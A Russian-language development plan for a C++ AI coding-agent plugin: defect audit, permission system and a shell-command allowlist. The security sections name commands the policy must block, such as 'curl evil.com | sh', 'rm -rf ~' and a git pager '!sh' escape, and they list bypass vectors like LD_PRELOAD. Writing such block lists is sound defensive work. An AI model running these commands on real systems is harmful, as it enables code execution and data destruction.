# wp_coder — план паритета агентных возможностей с opencode CLI

**Дата создания:** 2026-09-25
**Цель:** довести агентные возможности плагина `wp_coder` до уровня терминального агента opencode CLI.
**Ограничения идеологии проекта llama_gui:** всё на C++ (C++17), без Python/Runtime-зависимостей, встраивается в существующий plugin ABI.

Статусы: `[ ]` не начато · `[~]` в работе · `[x]` готово

> **Прогресс обновляется в разделе [§4](#4-трекинг-прогресса).** После каждой задачи: пометить маркер, обновить строку в таблице прогресса, добавить строку в журнал.

---

## 0. Диагностика: что реально есть в wp_coder сегодня

Проверено по исходникам (`nm` по `plugins/libwp_coder.so`, `CMakeLists.txt`, чтение кода).

### 0.1 Две параллельные системы, из них работает одна

| Система | Файлы | В сборке? | Состояние |
|---|---|---|---|
| **A. `core/` — ReAct-движок** | `core/*`, `modules/*`, `ui/*`, `src/plugin_main.cpp` | ✅ да | **Работает.** 50 инструментов, реальный LLM-цикл, сессия, разрешения, ретраи |
| **B. `src/wp_*_agent.cpp` + оркестратор** | 8 файлов, ~1500 строк | ❌ **нет** | **Мёртвый код.** 47 заглушек, 2 файла не компилируются |

Подтверждение: в `CMakeLists.txt:18-58` из `src/` попадает только `plugin_main.cpp`. Символов `plugin_get_exports` / `plugin_create_agent` в `.so` нет.

Файлы системы B ссылаются на **несуществующий** ABI: `AGENT_PLUGIN_API_VERSION`, `PluginExports`, `plugin_create_agent_fn` (`src/wp_coder_plugin.cpp:23,60-68`), а также на `agents::AgentContextMock` и `<gtest/gtest.h>` в тестах (`tests/test_wp_theme_agent.cpp:12`, `tests/test_wp_deploy_agent.cpp:15`) — ни того, ни другого в репозитории нет.

> Старый `plugins/wp_coder_refactor_plan.md` объявляет 100 % готовности. Он не соответствует коду: описанные «достижения» (оркестратор, профили, субагенты) — это именно непро-компилируемая система B. **План недействителен**, заменяется этим.

### 0.2 Подтверждённые дефекты (P0/P1)

> **Статус на 2026-09-25:** D1, D2, D10, D11 исправлены в итерации **И0**;
> D3, D4 — в итерации **И1**; D20, D21, D22 — там же (попутно);
> **D5 — в И3** (blocklist → allowlist). Волна A (И0–И3) закрыта.
>
> ⚠️ **Ложная атрибуция, исправлено в И1.10.** Долгое время «сегфолты
> `PluginLoader` и `MenuRestore`» считались предсуществующими и не
> связанными с `wp_coder`. Это было неверно. Падали обе — внутри
> `ll_plugin_init` плагина: бинарники тестов от **2026-08-29** читали
> `api->agent_mode_register` из структуры, собранной по ABI **до**
> его появления (коммит `63eb56b`, 2026-09-03). Отсутствие поля давало
> мусор `0x1`, и плагин вызывал его как функцию — SIGSEGV на `PC=0x1`.
> Проверка: `nm -C build/tests/test_plugin_loader | grep -c host_agent_mode_register` → `0`
> при `1` в свежей `libplugin_core.a`. То есть виновата была гнилая
> сборка (D22), а не код плагина. Правило: **«крашится в чужом модуле»
> не равно «виноват этот модуль» — сначала проверять возраст бинарника.**
> Остальные ждут своей итерации (указано в графе «Итерация»).

| # | Дефект | Место | Severity | Итерация |
|---|---|---|---|---|
| D1 | **Дедлок → зависание всего GUI.** `AgentLoop` берёт `state_.mtx`, внутри вызывает `SessionStore::trim()`, который берёт тот же нерекурсивный `std::mutex` (`engine.h:85`). Срабатывает при превышении `session_budget` (60 КБ ≈ 12 шагов). UI берёт тот же мьютекс → приложение зависает навсегда | `core/agent_components.cpp:494-502` + `:72` | **P0** | ✅ **И0.1** |
| D2 | `exec_command` зарегистрирован, но **не описан ни в одном промпте** → модель о нём не знает, инструмент мёртв | `core/base_tools.cpp:349` vs `core/prompts.h:45-67` | P1 | ✅ **И0.3** |
| D3 | **Research-режим не enforce'ился** — только текст в промпте. README обещает «только чтение» | `core/engine.cpp:232` | P1 | ✅ **И1.7** |
| D4 | **Plan-режим покрывал 4 инструмента из 50.** `exec_command`, `git_commit`, `deploy`, `cron_add`, `systemd_restart`, `docker_run`, `wp_create_site`, `pip_install` — идут мимо | `core/base_tools.cpp` | P1 | ✅ **И1.7** |
| D5 | **Blocklist вместо allowlist** для команд (9 подстрок). `rm -rf ~` проходит | `core/security.cpp:76-81` | P1 | ✅ **И3** |
| D6 | **Path-guard — строковый prefix**, не `realpath`/`weakly_canonical` → выход через symlink | `core/engine.h:184-218` | P1 | **И13.1** |
| D7 | `Engine::pending_apply` пишет файл **без проверки пути, разрешения и бэкапа** | `core/engine.cpp:245-256` | P1 | **И13.2** |
| D8 | `wp_create_site` собирает SQL строку, **снимая экранирование** `shell_quote` → пароль с `"` или `\` ломает выход | `modules/wordpress/wp_tools.cpp:217-220` | P1 | **И13.3** |
| D9 | `django_manage` интерполирует `args` без кавычек | `modules/python/python_tools.cpp:39` | P2 | **И13.4** |
| D10 | `load_session` — наивный сканер по `{`/`}`, а не JSON-парсер: содержимое с `}` рвёт сообщение | `core/engine.cpp:150-161` | P2 | ✅ **И0.5** |
| D11 | `SkillsManager::load()` очищает `active_` и не заполняет; при пустом `active_module` навыков в промпте нет **и** модель не знает про `skill_detail` | `core/skills_manager.cpp:18-37` | P2 | ✅ **И0.4** |
| D12 | Расхождение версий: `plugin.json` 0.3.0 / `plugins/wp_coder.json` 0.1.0 / `CHANGELOG` 0.4.0 / мёртвый `wp_coder_plugin.cpp` 0.4.0. Счётчики инструментов 49/51 при фактических 50 | 4 файла | P3 | ✅ **И0.8** |
| D13 | `core/project.cpp`: 4 пустые функции с комментарием «заглушка» | `core/project.cpp:15-35` | P3 | ✅ **И0.9** |
| D14 | Три конкурирующих реализации безопасности: `core/security.h` (слабая), `agents::SecurityManager` (не используется), `agents::Sandbox` (не используется) | — | P2 | **И13.12** |

### 0.3 Дефекты, найденные сверх плана (в процессе И0)

| # | Дефект | Место | Severity | Итерация |
|---|---|---|---|---|
| D15 | **29 инструментов из 50 невидимы для модели.** Инструменты модулей описываются только в промпте модуля, а он инжектится лишь при совпадении `active_module`. На чистой установке настройка пуста — модель не знает о `wp_cli`, `docker_build`, `pip_install` и остальных | `core/engine.cpp:211-226` | **P1** | ✅ **И0.4** |
| D16 | **Навыки из `.md` невызываемы.** Имя бралось из строки заголовка целиком: `# wp_setup — настройка окружения` → имя `"wp_setup — настройка окружения"`, а `skill_detail` делает точное сравнение | `core/skills_manager.cpp:100-113` | P2 | ✅ **И0.4** |
| D17 | **Выход из корня проекта через двоеточие.** `project_resolve()` считал абсолютным любой путь с `:` на второй позиции (`rel.find(":") == 1`), поэтому `a:b/c` уходил наружу мимо `is_path_outside` и `PermissionGate` | `core/project.cpp:51` | P1 | ✅ **И0.9** |
| D18 | **`exec_command` обходил контроль путей** — единственный инструмент, исполнявший произвольный код, был единственным без `PermissionGate` | `core/base_tools.cpp:349` | P1 | ✅ **И0.3** |
| D19 | **`save_session` мог оставить обрезанный файл** при падении посреди записи | `core/engine.cpp:119-139` | P3 | ✅ **И0.5** |
| D20 | **Хост читал устаревший `wp_coder.json` (0.1.0, без python/devops в capabilities)** | `CMakeLists.txt` | P1 | ✅ **И1.10** (правка И0.8 не работала, см. ниже) |
| D21 | **Общий `plugin.json` в каталоге с несколькими плагинами принадлежит всем сразу.** `hello_plugin` писал туда же с 08-06, `wp_coder` (И0.8) — туда же: кто записал последним, тот и «владелец». Плагин без своего манифеста подхватывал чужой: 08-26 — `wp_coder` получал версию 0.1.0, 09-25 — `hello_plugin` получал capabilities `wp_coder` | `plugins/examples/hello_plugin/CMakeLists.txt`, `src/plugins/plugin_manager.cpp:1022` | P1 | ✅ **И1.10** |
| D22 | **Зелёный свет в пустоту: `ctest` запускает бинарники, которых в коде нет.** CMake не удаляет сгенерированные файлы подкаталога, переставшего конфигурироваться. При `BUILD_TESTS=OFF` девять тестов от 2026-08-29 продолжали отвечать «Passed» за код, собранный месяц назад; два из них падали (см. примечание) | `CMakeLists.txt` (корень) | P1 | ✅ **И1.10** |

### 0.4 Что уже хорошо и должно быть сохранено

- `AgentLoop::run` (`core/agent_components.cpp:345-693`) — настоящий ReAct-цикл с guard'ами от зацикливания, trim'ом, метриками.
- `search_replace` уже имеет проверку уникальности совпадения (`base_tools.cpp:315-323`) — семантика opencode `edit` частично есть.
- `SkillsManager` — правильная прогрессивная выдача навыков (в промпт только имена, тела по запросу).
- `ToolArgs` фиксирован на 8 строковых слотов — это и сила (дёшево), и главное узкое место.
- В репозитории **уже собраны** `libtree-sitter-grammar-php.a`, `-python`, `-javascript`, `-cpp` и `core::AstParser` (`src/core/ast_parser.cpp`) — а `repo_map` делает примитивный `find("function ")`. Незадействованный актив.

---

## 1. Целевая архитектура: gap-таблица opencode → wp_coder

| Подсистема opencode | Где в opencode | Текущее состояние wp_coder | Итерация плана |
|---|---|---|---|
| Цикл с событийной моделью | `session/prompt.ts:1081 runLoop`, `session/processor.ts:30` | Плоский цикл, `RESULT [...]` как `user`-сообщение | **И5** |
| Типизированные инструменты со схемой | `tool/tool.ts:55 Tool.Def` (`parameters` — схема, `execute(args, ctx)`) | ✅ `ToolDef{name, description, JsonValue parameters, ToolFlags, ToolHandler2}` (`core/tool.h`) — И1.3 | **И1** |
| Валидация аргументов | `tool/tool.ts:135`, `InvalidArgumentsError` | ✅ `validate_tool_args` + сообщение в стиле opencode — И1.6 | **И1** |
| Политики по режимам (централизованно) | `agent/agent.ts:119-265` (permission на агента) | ✅ `check_tool_mode_policy` в `ToolRunner::run`, все 50 инструментов (было 4) — И1.7 | **И1** |
| Разрешения: `Rule[]`, last-match-wins, wildcards | `permission/index.ts:28 evaluate` | Только `PermissionGate` на внешние пути | **И2** |
| `once` / `always` / `reject` + каскад | `permission/index.ts:109 reply` | Только allow_once/allow_always для путей | **И2** |
| Статическое скрытие запрещённых инструментов | `permission/index.ts:204 disabled()` | Отсутствует | **И2** |
| Allowlist команд | `shell.ts:395-411` (обход дерева команд) | ✅ `CommandPolicy` — allowlist программ, рекурсивный разбор конвейеров, спец-валидаторы — И3.1–3.4 | ~~**И3**~~ |
| `glob` | `tool/glob.ts` (ripgrep) | ❌ отсутствует | **И4** |
| `apply_patch` (мульти-хуковый) | `tool/apply_patch.txt`, `patch/index.ts:19` | ❌ отсутствует | **И4** |
| `todowrite` | `tool/todo.ts` | ❌ отсутствует | **И4** |
| `edit` — каскад из 9 заменителей | `tool/edit.ts:682 replace()` | только точное уникальное совпадение | **И4** |
| `edit` — защита от диспропорционального спана | `tool/edit.ts:731` | ❌ | **И4** |
| `read` с `offset`/`limit` + attach близких AGENTS.md | `tool/read.ts`, `session/instruction.ts:179` | `K` перегружен как «пропустить строки» | **И4**, **И9** |
| `bash` (заменяет `exec_command`): таймаут по умолчанию 120 с; кольцевой буфер с live-`metadata` для UI; при превышении лимита — **spill в файл** + путь в выводе; таймаут-блок с пояснением в терминах `<shell_metadata>` (порт `shell.ts:428-594`). Гейт на внешние пути уже добавлен в И0.3 (D18). | `tool/shell.ts:428-594` | `popen` + post-hoc `cap()`; гейт путей добавлен | **И4** |
| Универсальное усечение вывода (2000 строк / 50 КБ + spill) | `tool/truncate.ts` | Локальные лимиты в каждом инструменте | **И4** |
| `bash`-предсказание `always`-паттерна (безопасный префикс + `*`) | `shell.ts:411` | ❌ | **И3** |
| События LLM: 16-вариантный `LLMEvent` | `packages/llm/src/schema/events.ts:209` | ❌ (блокирующий вызов) | **И5**, **И6** |
| Части сообщения с 4-состоянийным `ToolState` | `packages/schema/src/v1/session.ts` | ❌ | **И5** |
| Учёт токенов (incl. + exclusive) | `events.ts:51 Usage` | Только сумма prompt/completion | **И5** |
| Стриминг через plugin ABI | `complete_streaming_async` есть в хосте, но **не выставлен в `LlamaHostApi`** | ❌ | **И6** |
| Отмена (Abort) с каскадом в инструменты | `ctx.abort` + `forceKillAfter` | `std::async`-брошенный future | **И6** |
| Компакшн: head/tail, суммаризация, автопродолжение | `session/compaction.ts` | `SessionStore::trim` — обрезка строк | **И7** |
| Математика переполнения с резервом | `session/overflow.ts` | фиксированные 60 КБ | **И7** |
| Сабагенты: `task`-инструмент, лимит глубины, дочерние сессии | `tool/task.ts` | ❌ (система B мертва) | **И8** |
| Наследование разрешений субагентом | `agent/subagent-permissions.ts` | ❌ | **И8** |
| Конфиг-агенты: markdown + frontmatter, `mode`, `tools`, `permission`, `steps` | `config/agent.ts:11`, `agent/agent.ts:35` | 4 inert JSON-профиля (`load_harness_profile` их не читает) | **И8** |
| Встроенные агенты (`build`/`plan`/`general`/`explore`/`compaction`/`title`/`summary`) | `agent/agent.ts:119-265` | ❌ | **И8** |
| Инструкции `AGENTS.md` / `CLAUDE.md` с proximity-attach | `session/instruction.ts:110,179` | ❌ | **И9** |
| Навыки (`<skill_content>`, каталог с двумя уровнями детализации) | `src/skill/`, `session/system.ts:107` | частично (свой формат); **D16 закрыт в И0.4** | **И9** |
| Снапшоты и revert по git-дереву | `snapshot.ts` (`git stash create` / `write-tree`) | `undo_edit` — один слот `.orig` | **И10** |
| Diff-рендеринг в UI | `packages/tui/.../session/index.tsx:2404` | ❌ | **И11** |
| Таймлайн/дерево вызовов инструментов, `showDetails` | TUI | Только текстовый лентящийся фид | **И11** |
| Промпты по семейству модели | `session/system.ts:28 SystemPrompt.provider` | Один промпт | **И12** |
| `experimental_repairToolCall` → скрытый `invalid`-инструмент | `llm.ts:296` | Каскад из 6 эвристик парсера | **И12** |
| Подмена `edit`+`write` → `apply_patch` для gpt-* | `tool/registry.ts:297` | ❌ | **И12** |
| Детектор doom-loop | `processor.ts:356` | Есть, окно 8 вместо 3 | **И4** |

**Что сознательно НЕ переносим:** MCP (роль модулей играет `CoderModule`), SQLite-хранилище (достаточно JSON с атомарной записью), темы/автообновление/share (CLI-функции), `Effect`-пайплайн (заменяется на RAII + condvar), `experimental_code_mode`, LSP-тулза (отдельная итерация, если будет спрос).

---

## 2. Архитектурные решения (принять до начала кодинга)

| # | Решение | Обоснование |
|---|---|---|
| D-1 | **Одна система, не две.** Всё в `core/`. Мёртвый `src/wp_*_agent.cpp` удаляется, его роль переотдаёт И8 (субагенты) | Две системы = источник всех заблуждений в документации |
| D-2 | **Собственный `JsonValue` (DOM) в `core/json.h`**, не расширение текущего `core/json_utils.h` | Текущий — только извлекатель полей (`json::str`, `json::int_`), без массивов/вложенности. Нужны схемы, аргументы, `tool_output` |
| D-3 | **`ToolDef` вместо `ToolHandler`**; аргументы — `JsonValue::object`, схема — `JsonValue` (JSON Schema-подобная) | Снимает необходимость трогать 4 файла при добавлении параметра; даёт валидацию и генерацию описаний для модели |
| D-4 | **Единая точка enforcement** в `ToolRunner::run` (per-tool флаги `read_only`/`writes`/`executes`/`network`), а не проверки внутри инструментов | Сегодня правила размазаны и покрывают 4 из 50 (D4) |
| D-5 | **Расширить `LlamaHostApi` append-only** полями `llm_chat_stream` и `llm_ast_symbols`; в плагине — feature-probe через `offsetof` (паттерн уже есть в `plugin_main.cpp:127-130`) | Единственный способ получить стриминг и tree-sitter; ABI-совместимость сохранена |
| D-6 | **Рендеринг — только UI-поток; вычисления — worker-поток.** Никогда не рисовать в `on_message` | `plugin_api.h:69-73` явно запрещает; текущий UI берёт `st.mtx` под ImGui (`ui/coder_window.cpp:361-400`) — источник риска зависания |
| D-7 | **`wp_coder_core` остаётся статической библиотекой без зависимости от хоста** (только колбэки) | Сохраняет юнит-тестируемость — текущий сильный момент |
| D-8 | **Дерево-ситтер для `repo_map`/символов** — через новый хостовый API `llm_ast_symbols`, а не линковка `ast_parser.cpp` в плагин | Не дублировать 28 Кб парсера; хост уже собрал грамматики |

---

## 3. План работ по итерациям

Оценки в человеко-днях. Каждая итерация заканчивается сборкой + зелёными тестами + обновлением [§4](#4-трекинг-прогресса).

### Волна A — «не слокано» (И0–И3, ~10 дн.) — **✅ завершена 100 %**

---

#### И0. Стабилизация и честность (~1 дн.) — **✅ завершено 2026-09-25**

- [x] **0.1** Исправить D1: `SessionStore::trim_if_needed()` — единственная точка входа, мьютекс берётся ровно один раз внутри. На месте вызова в `AgentLoop::run` лок больше не берётся.
- [x] **0.2** Регрессионный тест `test_engine.cpp` — 4 теста: завершение `trim_if_needed()` при превышении бюджета, паттерн вызова из цикла, отсутствие блокировки UI-читателя, `over_budget()` в границах. **Баг воспроизведён намеренно и тест это поймал** (возврат `std::lock_guard` в `trim_if_needed` → провал по таймауту).
- [x] **0.3** Исправить D2: `exec_command` добавлен в таблицу инструментов `core/prompts.h` + правило «крайняя мера». Попутно исправлено **D18**: добавлен гейт на пути вне проекта (`first_external_path()` + `guard_permission()`) — раньше `exec_command` был единственным инструментом, исполнявшим код, и единственным без контроля путей.
- [x] **0.4** Исправить D11: `SkillsManager::refresh_active()` с разумным дефолтом; `build_skills_prompt()` больше не возвращает пустую строку; вызов в `plugin_main.cpp` снят с условия. Попутно исправлено **D15** (каталог инструментов модулей в системном промпте, строится из реестра) и **D16** (имя навыка из `.md` = имя файла, а не текст заголовка).
- [x] **0.5** Исправить D10: `json::parse_message_array()` в `core/json_utils.h` — полноценный разбор со строковыми литералами, escape-последовательностями и сурогатными парами. Попутно исправлено **D19**: атомарная запись сессии (temp + rename).
- [x] **0.6** Удалён мёртвый код: 17 файлов `src/wp_*_agent.*` + `wp_coder_orchestrator.*` + `wp_coder_plugin.cpp` и 2 теста к ним. История в git, `src/README.md` объясняет, почему в `src/` только `plugin_main.cpp`, и запрещает возвращать код без записи в CMake и тесты. `MODULE_DEVELOPMENT.md` и `USAGE.md` помечены устаревшими. Тест `no_removed_symbols_in_sources` блокирует возврат ссылок на несуществующий ABI.
- [x] **0.7** `plugins/wp_coder_refactor_plan.md` помечен недействительным со ссылкой на этот план.
- [x] **0.8** Исправлено D12: версия 0.5.0, `plugin.json` — единственный источник истины (CMake извлекает `WP_CODER_VERSION`), копируется рядом с `.so`. Попутно исправлено **D20**. Счётчики приведены к фактическим: 50 инструментов, 138 тестов.
  > **Поправка И1.10:** вывод про D20 был неверен. Копия `plugin.json` оказалась
  > кандидатом №4 в `find_manifest_path` и не сработала — хост читал старый
  > `wp_coder.json`. Хуже того, копия общего имени породила **D21**. Задача
  > 0.8 в части «копируется рядом с `.so`» переисполнена в **1.10**.
- [x] **0.9** `core/project.cpp`: удалены 4 заглушки без единого вызывающего (реальную работу делает `Engine`), `project.h` переписан. Попутно исправлено **D17** (`: ` больше не делает путь абсолютным).

**Итог И0:** D1, D2, D10, D11, D12, D13 закрыты; попутно найдено и закрыто D15–D20. Тесты 107 → 138, все зелёные. Веха **M1 «не зависает»** достигнута.

---

#### И1. Типизированные инструменты (~4 дн.) — **✅ завершено 2026-09-25**

- [x] **1.1** `core/json.h` / `json.cpp`: `JsonValue` (null/bool/int/double/string/array/object), парсер и сериализатор, доступ по пути `get("a.b[0]")`.
- [x] **1.2** Перенести `tool_protocol.cpp` на `JsonValue`; сохранить все 6 эвристик `extract_action` и 17 существующих тестов парсера.
- [x] **1.3** `core/tool.h`: `ToolDef { name, description, JsonValue parameters, ToolFlags flags, ToolHandler2 }`, где `ToolHandler2 = std::function<ToolOutput(const JsonValue& args, ToolContext&)>`, `ToolOutput { title, output, JsonValue metadata, bool truncated }`.
- [x] **1.4** `ToolFlags` — битовая маска: `READ_ONLY | WRITES_FILES | EXECUTES | NETWORK | DESTRUCTIVE | SLOW`.
- [x] **1.5** `core/tool_registry.{h,cpp}`: хранить `ToolDef`, генерировать описание инструментов для промпта из схем (используется вместо ручного списка в `prompts.h:45-67` — устраняет дрейф документации).
- [x] **1.6** Валидация аргументов по схеме с сообщением в стиле opencode: `The <tool> tool was called with invalid arguments: <detail>. Please rewrite the input so it satisfies the expected schema.`
- [x] **1.7** **Централизованный enforcement** (D4/D3): в `ToolRunner::run` блокировать по `ToolFlags` согласно `mode`/`plan_mode`; удалить хардкод-проверки из 4 инструментов.
- [x] **1.8** Мигрировать 50 инструментов по модулям: `core/base_tools` (14) → `core/git_tools` (7) → `modules/wordpress` (12) → `modules/python` (6) → `modules/devops` (11).
- [x] **1.9** Тесты: валидация схем, `ToolFlags`-фильтрация по режимам (в т.ч. регрессия «research не может писать»).
- [x] **1.10** **Мина замедленного действия — манифесты и гнилая сборка.** Закрыть D20 (правка 0.8 не работала), D21 (общий `plugin.json` в каталоге с несколькими плагинами) и D22 (`ctest`, запускающий бинарники месячной давности, показывал «Passed» за код, которого в них нет; именно это давало «сегфолты» `PluginLoader`/`MenuRestore`).
  1. Манифест копируется под именем плагина (`wp_coder.json`, `hello_plugin.json`), общий `plugin.json` из каталога удаляется.
  2. Хост **отбрасывает** манифест с чужим `name`, а не предупреждает о нём.
  3. Тест `PluginLoader` закрепляет инвариант «манифест принадлежит своему плагину» и наличие собственного манифеста у `hello_plugin`.
  4. Корень `CMakeLists.txt` падает при `BUILD_TESTS=OFF` + оставшихся `tests/CTestTestfile.cmake`.
  5. Регрессии в наборе `wp_coder` (манифест по месту, содержимое CMakeLists, guard хоста, guard корневого CMake).

**Итог И1:** закрыты D3 и D4, а также D20, D21, D22 (задача 1.10 — мина
замедленного действия: манифесты в общем каталоге и «зелёный» `ctest`
на бинарниках месячной давности). Реестр хранит `ToolDef` (схема + флаги),
описание для промпта и валидация читают одну схему — ручной список в
`prompts.h` удалён. Enforcement по `ToolFlags` живёт в `ToolRunner::run` и
покрывает все 50 инструментов. `permission_key` в `ToolDef` объявлен,
заполнит И2 (2.9). Тесты 138 → 179, все зелёные. Хостовые `ctest` 8/10 →
10/10 на пересобранных бинарниках.

**Готово, когда:** добавление параметра к инструменту = правка одного файла; research/plan-режим enforce'ятся централизованно и покрыты тестами. ✅

---

#### И2. Система разрешений (~4 дн.) — **✅ завершено 2026-09-25**

- [x] **2.1** `core/permission.{h,cpp}`: `enum class PermissionAction { Allow, Deny, Ask }` (не `Action` — имя уже занято структурой вызова инструмента, `core/tool_protocol.h:35`), `struct Rule { std::string permission, pattern; PermissionAction action; std::string comment; }`, `class Ruleset` (упорядоченный вектор).
- [x] **2.2** `Wildcard::match(pattern, value)` — `*` и `?`, как в opencode; порядок правил = семантика (**last match wins**).
- [x] **2.3** `PermissionEngine::evaluate(permission, pattern) -> PermissionAction`; дефолт при отсутствии правил — `Ask`.
- [x] **2.4** Дефолты уровня агента (портировать `agent/agent.ts:119-140`): `* → allow`, `doom_loop → ask`, `external_directory → ask` (whitelist: data_dir, tmp, skills), `read` с `*.env → ask`, `deploy/systemd/ssh → ask`. **Перечень расширен** до всех групп с `TF_DESTRUCTIVE` — см. «Отклонения от плана», №10.
- [x] **2.5** `PermissionEngine::ask(permission, patterns, always, metadata)` — кондивар-ожидание + отправка запроса в UI (переиспользовать существующий механизм `permission_cv`).
- [x] **2.6** Ответы `once` / `always` / `reject`; при `reject` — **каскадный отклон** всех прочих ожидающих запросов в этой сессии (порт `permission/index.ts:109`).
- [x] **2.7** `PermissionEngine::approve(permission, pattern)` — при `always` пересканировать ожидающие и авто-разрешить подходящие.
- [x] **2.8** `PermissionEngine::visible_tools(all)` — инструменты с catch-all `deny` **убираются из схемы** (порт `disabled()`), чтобы модель не тратила шаг на заведомо отклонённый вызов.
- [x] **2.9** Заполнить `permission_key` у каждого из 50 инструментов в `ToolDef` (поле объявлено в И1.3, `core/tool.h`).
- [x] **2.10** Тесты: last-match-wins, wildcards, каскад reject, авто-разрешение по `always`, скрытие инструментов.

**Итог И2:** система разрешений встроена в существующий `PermissionGate` и
точку enforcement `ToolRunner::run` — не заменяет их. Правила упорядочены,
последнее совпавшее выигрывает; дефолт при отсутствии правил — `Ask`.
Ответы `once`/`always`/`reject`, отказ каскадит на все ожидающие, «всегда»
пересканирует очередь. Заполнен `permission_key` у всех 50 инструментов
(14 групп). Инструменты с catch-all `deny` убираются из каталога промпта.
Дефолты агента: 13 групп спрашивают, `read *.env*` спрашивает, whitelist
доверенных каталогов снимает вопрос с `/tmp` и data_dir. Тесты 179 → 234,
все зелёные; хостовые `ctest` 10/10.

**Готово, когда:** все опасные инструменты спрашивают подтверждение с предлагаемым `always`-паттерном; отклонение каскадит; denied-инструменты не видны модели. ✅

---

#### И3. Политика команд: blocklist → allowlist (~2 дн.) — **✅ завершено 2026-09-25**

- [x] **3.1** `core/command_policy.{h,cpp}`: `CommandPolicy { std::set<std::string> allowed_binaries; std::vector<Rule> arg_rules; }`.
  > Добавлено третье поле — доверенные сетевые хосты для `curl`/`wget` (см.
  > отклонение №16): без него требование 3.4 «только allowlisted хосты»
  > было бы недостижимо, а allowlist хостов без исключения для localhost
  > запрещал бы проверку собственного сайта.
- [x] **3.2** Токенизация команды с учётом кавычек и `$`; структура `ParsedCommand { binary, args, redirections, env, sub_commands, has_substitution }`.
  > Сопоставление имён идёт по **вариантам** (`php8.1` → `php`, `mkfs.ext4` → `mkfs`), а не по одному нормализованному имени: отбрасывание номера версии обрезало `mkfs.ext4` посередине, и запрет на `mkfs` переставал срабатывать. Тест поймал это первым.
- [x] **3.3** Рекурсивный обход конвейеров `|`, `&&`, `;`, `$( )`, backticks — **каждая** подкоманда проверяется отдельно. Вложенность ограничена 8 уровнями: глубже — отказ, а не пропуск.
- [x] **3.4** Спец-валидаторы по бинарнику: `git` (запрет `--exec-path`, `-c core.pager=`, `!`-alias), `sudo` (запрет `-E`, запись в `sudoers`), `curl`/`wget` (только allowlisted хосты), `rm` (запрет `-rf` с абсолютным путём), `dd`, `mkfs`.
  > Перечень расширен: универсальные обходы (`sh`, `env`, `xargs`, `nohup`, `eval`, `su`, `find -exec`), код из строки у интерпретаторов (`python3 -c`, `php -r`, `node -e`, `awk 'system(…)'`), переменные окружения (`PATH`, `LD_PRELOAD`, `IFS`, `GIT_SSH_COMMAND`) и персистентные хуки `git config core.pager/editor/alias/hookspath` — см. отклонение №17.
- [x] **3.5** `CommandPolicy::always_pattern(argv)` → безопасный префикс + `*` (порт `shell.ts:411`) — чтобы «всегда разрешить `git status --porcelain`» не разрешало `git push --force`.
  > Подключено в `permission_suggested_pattern` для ключей `bash`, `docker`, `cron`, `ssh`, `deploy`; для путей и URL значение не сужается. **Одно ожидание теста изменено по существу**: прежнее кодировало ровно то поведение, которое 3.5 закрывает.
- [x] **3.6** Заменить `is_command_allowed` (blocklist) на `CommandPolicy` в `exec_command`; добавить политику в `git_*`, `deploy`, `systemd_*`, `docker_*`, `ssh_exec`, `wp_cli`.
  > Точка подключения — **обёртка `shell::run_capture`/`run_capture_status`**, а не каждый инструмент: это единственные места, где собранная плагином команда уходит в процесс, и проверка, которую можно забыть, проверкой не является. У произвольных команд allowlist обязателен, у собранных плагином — только запреты (см. отклонение №18).
- [x] **3.7** Удалить `WPDeployAgent`-подобное исполнение LLM-строк через `std::system` (в мёртвом коде `src/wp_deploy_agent.cpp:160-174`) — при удалении И0.6 это происходит автоматически.
  > Само удаление произошло в И0.6, но ничем не было защищено. Добавлены два guard-теста (`no_std_system_in_sources`, `all_shell_execution_goes_through_the_guarded_wrapper`), оба **проверены мутацией**: с подставленным `std::system` и подставленным `popen` они падают.
- [x] **3.8** Тесты: таблица разрешённых/запрещённых команд, рекурсия конвейеров, `always`-паттерны.
  > 25 новых тестов. Среди них — **таблица команд, которые собирает сам плагин** (49 шаблонов из `core/`, `modules/`): allowlist, применённый не к тому, ломает инструменты, и тест обязан падать первым, а не пользователь.

**Итог И3:** закрыт D5, закрыта веха M2. Политика команд подключена в двух режимах по источнику бинарника: `check()` с allowlist программ и хостов — для `exec_command`, где программу выбирает модель; `check_assembled()` с одними запретами — для 49 остальных инструментов, где бинарник выбрал код плагина. Отказ политики подтверждению пользователем не подлежит: правило «bash → allow» не отменяет запрет, иначе политика была бы украшением. Попутно исправлен `wp_create_site`: обратные кавычки SQL внутри двойных кавычек shell были подстановкой команды, и сайт не создавался вообще. Тесты 234 → 259, все зелёные; `ctest` 10/10.

**Готово, когда:** `rm -rf ~`, `curl evil.com | sh`, `sudo -E …`, `git -c core.pager='!sh' …` — запрещены; легитимные команды проходят. ✅

---

### Волна B — «паритет инструментов» (И4–И7, ~16 дн.)

---

#### И4. Паритет набора инструментов (~6 дн.)

- [x] **4.1** `glob`: `core/glob.h` — рекурсивный обход с поддержкой `**`, `*`, `?`, `{a,b}`; фильтры по расширению; сортировка по mtime; лимит 100. Инструмент `glob { pattern, path }`.
- [x] **4.2** `apply_patch`: формат `*** Begin Patch / Add File / Delete File / Update File / Move to / @@ хуки` (порт `tool/apply_patch.txt`); внутренняя модель `Hunk { old_lines, new_lines, change_context, is_end_of_file }`. Инструмент `apply_patch { patchText }`.
- [x] **4.3** `edit` — **каскад из 9 заменителей** (порт `tool/edit.ts:682`): `Simple`, `LineTrimmed`, `BlockAnchor` (с порогом похожести 0.65), `WhitespaceNormalized`, `IndentationFlexible`, `EscapeNormalized`, `TrimmedBoundary`, `ContextAware`, `MultiOccurrence`. Уникальность проверяется на каждом кандидате, ошибка — только когда исчерпаны все стадии.
- [x] **4.4** `edit` — защита от диспропорционального спана: отказ, если `searchLines >= max(oldLines+3, oldLines*2)` (порт `edit.ts:731`).
- [x] **4.5** `edit`/`write` — сохранять BOM и CRLF; семафор на файл (opencode `Semaphore(1)` на `filePath`).
- [x] **4.6** `todowrite { todos: [{id, content, status, priority}] }` + `todoread`; отображение состояния в UI (И11) и в системном промпте.
- [x] **4.7** `read { filePath, offset, limit }` — `offset` с 1, `limit` по умолчанию 2000; детект бинарника (доля непечатаемых > 30 %); каталоги → список; вложенные `AGENTS.md` через `metadata.loaded` (задел для И9).
- [x] **4.8** `bash` (заменяет `exec_command`): таймаут по умолчанию 120 с; кольцевой буфер с live-`metadata` для UI; при превышении лимита — **spill в файл** + путь в выводе; таймаут-блок с пояснением в терминах `<shell_metadata>` (порт `shell.ts:428-594`).
- [x] **4.9** `list { path, depth }` — отдельный инструмент (в opencode остался только как ключ разрешения, но для нашей модели полезен).
